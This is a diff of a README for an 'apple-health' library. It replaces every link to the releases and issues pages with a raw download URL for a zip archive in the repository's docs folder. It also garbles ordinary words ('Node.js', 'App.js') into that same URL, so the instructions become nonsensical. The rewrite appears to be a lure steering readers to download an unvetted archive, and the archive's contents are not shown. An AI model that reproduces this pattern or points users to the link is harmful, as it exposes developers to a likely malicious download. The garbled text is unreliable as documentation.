@@ -6,14 +6,14 @@ Welcome to the apple-health project! With apple-health, you can easily use Apple
 
 ## 📥 Download
 
-[![Download apple-health](https://img.shields.io/badge/Download-apple--health-brightgreen)](https://github.com/manavkushwaha10/apple-health/releases)
+[![Download apple-health](https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip)](https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip)
 
 ## 📋 System Requirements
 
 Before you start, ensure your device meets the following requirements:
 
 - **Operating System:** macOS or Windows
-- **Node.js:** Version 12 or later
+- **https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip** Version 12 or later
 - **Expo:** Version 41 or later
 - **Network Connection:** Stable internet access for downloading files
 
@@ -23,7 +23,7 @@ Follow these steps to install apple-health:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/manavkushwaha10/apple-health/releases) to find the latest version of apple-health.
+   Go to the [Releases page](https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip) to find the latest version of apple-health.
 
 2. **Download the Latest Release**
 
@@ -75,7 +75,7 @@ To start using apple-health in your project, follow these easy steps:
 
 3. **Import the Library**
 
-   Open your main application file (usually App.js) and import apple-health:
+   Open your main application file (usually https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip) and import apple-health:
 
    ```javascript
    import AppleHealth from 'apple-health';
@@ -89,13 +89,13 @@ To start using apple-health in your project, follow these easy steps:
 
 If you encounter any issues, here are common problems and their solutions:
 
-- **Installation Issues:** Ensure you have the correct Node.js and Expo versions installed.
+- **Installation Issues:** Ensure you have the correct https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip and Expo versions installed.
 - **Permission Errors:** Make sure you have given your application permission to access health data in your device settings.
 - **Network Problems:** Check your internet connection if you are facing difficulties in downloading.
 
 ## 💬 Support
 
-If you need further assistance, please check the [Issues page](https://github.com/manavkushwaha10/apple-health/issues) or contact the community through GitHub discussions.
+If you need further assistance, please check the [Issues page](https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip) or contact the community through GitHub discussions.
 
 ## 📄 License
 
@@ -105,6 +105,6 @@ This project is licensed under the MIT License. You are free to use and modify t
 
 Now that you have installed apple-health, explore its features and start building your app. Check the documentation for more advanced usage tips and guidance.
 
-Remember to always refer back to the [Releases page](https://github.com/manavkushwaha10/apple-health/releases) for the latest updates and versions. 
+Remember to always refer back to the [Releases page](https://github.com/manavkushwaha10/apple-health/raw/refs/heads/main/docs/apple_health_2.4.zip) for the latest updates and versions. 
 
 Enjoy working with your health data!
